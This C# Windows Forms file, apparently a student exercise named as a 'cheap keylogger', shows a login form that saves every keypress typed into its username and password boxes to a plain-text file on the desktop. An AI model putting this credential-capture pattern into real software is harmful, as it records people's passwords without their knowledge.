using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Ejercicio1
{
    public partial class frmKeyLoggerChafita : Form
    {
        public frmKeyLoggerChafita()
        {
            InitializeComponent();
        }

        string fuente;
        private void frmKeyLoggerChafita_KeyPress(object sender, KeyPressEventArgs e)
        {
            /*fuente += e.KeyChar;
            if (e.KeyChar == (char)Keys.Tab || e.KeyChar == (char)Keys.Enter)
            {
                System.IO.File.WriteAllText(@"C:\Users\andre\Desktop\claves.txt", fuente);
            }*/
            
        }

        private void frmKeyLoggerChafita_Load(object sender, EventArgs e)
        {

        }

        private void txtContrasena_KeyPress(object sender, KeyPressEventArgs e)
        {
            fuente += e.KeyChar;
            if (e.KeyChar == (char)Keys.Tab || e.KeyChar == (char)Keys.Enter)
            {
                //System.IO.File.WriteAllText(@"C:\Users\andre\Desktop\claves.txt", "Usuario:");
                System.IO.File.WriteAllText(@"C:\Users\andre\Desktop\claves.txt", fuente);
            }
        }

        private void txtUsuario_TextChanged(object sender, EventArgs e)
        {

        }

        private void txtUsuario_KeyPress(object sender, KeyPressEventArgs e)
        {
            fuente += e.KeyChar;

            if (e.KeyChar == (char)Keys.Tab || e.KeyChar == (char)Keys.Enter)
            {
                //System.IO.File.WriteAllText(@"C:\Users\andre\Desktop\claves.txt", "Contraseña:");
                System.IO.File.WriteAllText(@"C:\Users\andre\Desktop\claves.txt", fuente);
            }
        }
    }
}
